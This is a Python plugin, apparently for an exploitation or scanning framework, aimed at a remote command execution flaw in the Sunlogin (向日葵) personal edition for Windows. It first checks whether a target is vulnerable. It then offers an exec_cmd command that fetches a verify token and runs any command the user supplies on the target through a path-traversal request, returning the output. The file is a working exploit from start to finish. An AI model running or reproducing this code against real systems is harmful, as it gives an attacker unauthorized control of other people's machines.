# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "向日葵个人版命令执行漏洞",
        "description": "上海贝锐信息科技股份有限公司向日葵个人版for Windows存在命令执行漏洞, 攻击者可利用该漏洞获取服务器控制权",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./cgi-bin/rpc?action=verify-haras',
            timeout=15
        )
        if 'verify_string' in r.text:
            token = r.json()['verify_string']
            r = self.request(
                method='get',
                path='./check?cmd=ping../../../../../../../../../../../windows/system32/help',
                timeout=15,
                headers={"Cookie": f"CID={token}"}
            )
            if 'WMIC' in r.text:
                return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(
                url,
                './cgi-bin/rpc?action=verify-haras'
            ),
            timeout=15
        )
        if 'verify_string' in r.text:
            token = r.json()['verify_string']
            r = self.request(
                method='get',
                url=urllib.parse.urljoin(
                    url,
                    f'./check?cmd=ping../../../../../../../../../../../windows/system32/{cmd}'
                ),
                timeout=15,
                headers={"Cookie": f"CID={token}"}
            )
            self.log.success(r.text)
        else:
            self.log.failure('命令执行失败')
